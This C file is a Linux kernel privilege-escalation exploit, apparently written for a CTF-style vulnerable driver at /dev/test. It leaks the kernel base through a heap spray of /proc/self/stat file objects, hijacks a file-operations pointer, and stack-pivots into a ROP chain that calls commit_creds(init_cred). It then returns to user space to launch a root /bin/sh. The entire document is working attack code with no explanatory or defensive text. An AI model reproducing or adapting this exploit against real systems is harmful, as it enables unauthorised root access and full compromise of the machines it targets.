#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/shm.h>
#include <sys/capability.h>

#include <linux/btrfs.h>
#include <linux/userfaultfd.h>
#include <linux/sysctl.h>
#include <linux/capability.h>
#include <linux/types.h>
#include <liburing.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

u8 WAIT()
{
    write(STDERR_FILENO, "[WAITING...]\n", 13);
    u8 c;
    read(STDIN_FILENO, &c, 1);
    return c;
}

static inline void panic(const char* msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

uint64_t bak1;
uint64_t bak2;
uint64_t bak3[2];
uint64_t bak4[2];
uint64_t bak5[11];

void getShell()
{
    if (getuid())
    {
        panic("NO ROOT");
    }
    logOK("Rooted!");

    *(uint64_t*)(0x1337060) = bak1;
    *(uint64_t*)(0x13380b0) = bak2;
    memcpy((void*)0x1338000, bak3, sizeof(bak3));
    memcpy((void*)0x1338090, bak4, sizeof(bak4));
    memcpy((void*)0x1337078, bak5, sizeof(bak5));

    char* argv[] = { "/bin/sh", NULL };
    char** envp = &argv[1];
    execve(argv[0], argv, envp);
}



void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

#define devfile "/dev/test"

int devfd;
char* m1;
char* m2;
char* m3;
uint64_t kbase;
#define FIX_ADDR(x) (x-0xffffffff81000000+kbase)

int main(int argc, char** argv, char** envp)
{

    pin_cpu(0);
    save_state();

    int devfd1 = open(devfile, O_RDWR);
    int devfd2 = open(devfile, O_RDWR);
    // int devfd3 = open(devfile, O_RDWR);


    int ran = open("/dev/urandom", O_RDONLY);

    int fds[0x3000 / 0x20] = { 0 };
    uint i = 0;

    char buf[0x321];
    read(ran, buf, sizeof(buf));
    buf[0] = 0;

    m1 = mmap((void*)0x1337000, 0x3000,
        PROT_READ | PROT_WRITE, MAP_FILE | MAP_FIXED | MAP_SHARED, devfd1, 0);
    if (m1 == MAP_FAILED) {
        panic("mmap(m1)");
    }

    m1[0] = 'A';
    m1[0x1000] = 'B';
    m1[0x2000] = 'C';

    m2 = mmap((void*)0x1347000, 0x3000,
        PROT_READ | PROT_WRITE, MAP_FILE | MAP_FIXED | MAP_SHARED, devfd2, 0);
    if (m2 == MAP_FAILED) {
        panic("mmap(m2)");
    }

    m2[0] = 'A';
    m2[0x1000] = 'B';
    m2[0x2000] = 'C';

    usleep(1000);
    pin_cpu(0);

    for (uint i = 0; i < 9;++i)
        open("/proc/self/stat", O_RDONLY);

    write(devfd1, buf, sizeof(buf));

    for (i = 0; i < 0x3000 / 0x20; ++i) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        if (fds[i] < 0)
            panic("spray open");
    }

    uint64_t proc_single_file_operations = *(uint64_t*)(0x13380b0);
    uint64_t victim_chunk = *(uint64_t*)(0x1337048);

    kbase = proc_single_file_operations - 0x1226c20;
    logOK("kbase = %p", (void*)kbase);
    logOK("victim_chunk = %p", (void*)victim_chunk);

    if (victim_chunk < 0xffff000000000000 || kbase < 0xffff000000000000 || kbase % 0x1000) {
        logErr("Try harder\n");
        _exit(-1);
    }

    bak1 = *(uint64_t*)(0x1337060);
    bak2 = *(uint64_t*)(0x13380b0);

    *(uint64_t*)(0x1337060) = FIX_ADDR(0xffffffff814bb6fc); // leave ; ret
    *(uint64_t*)(0x13380b0) = victim_chunk + 0x18 - 0x10;

    uint64_t pre_rop[] = {
        0,
        FIX_ADDR(0xffffffff81ebebc1), // add rsp , 0x30 ; ret
    };

    logInfo("%lx\n", FIX_ADDR(0xffffffff814bb6fc));

    memcpy(bak3, (void*)0x1338000, sizeof bak3);
    memcpy((void*)0x1338000, pre_rop, sizeof(pre_rop));

    uint64_t rop1[] = {
        FIX_ADDR(0xffffffff81287be2), // pop rsp ; ret
        victim_chunk + 0x30
    };

    memcpy(bak4, (void*)0x1338090, sizeof bak4);
    memcpy((void*)0x1338090, rop1, sizeof(rop1));

    uint64_t rop2[] = {
        FIX_ADDR(0xffffffff812884c6), // pop rdi ; ret
        FIX_ADDR(0xffffffff82a52ca0), // init_cred
        FIX_ADDR(0xffffffff810bc170), // commit_creds
        FIX_ADDR(0xffffffff82001637), // ret2user
        0, 0,
        user_ip, user_cs, user_rflags, user_sp, user_ss
    };

    memcpy(bak5, (void*)0x1337078, sizeof bak5);
    memcpy((void*)0x1337078, rop2, sizeof(rop2));

    for (i = 0; i < 0x3000 / 0x20; ++i)
    {
        printf("%u\n", i);
        *(uint64_t*)(0x1337060) = FIX_ADDR(0xffffffff814bb6fc);
        read(fds[i], buf, 1);
    }

}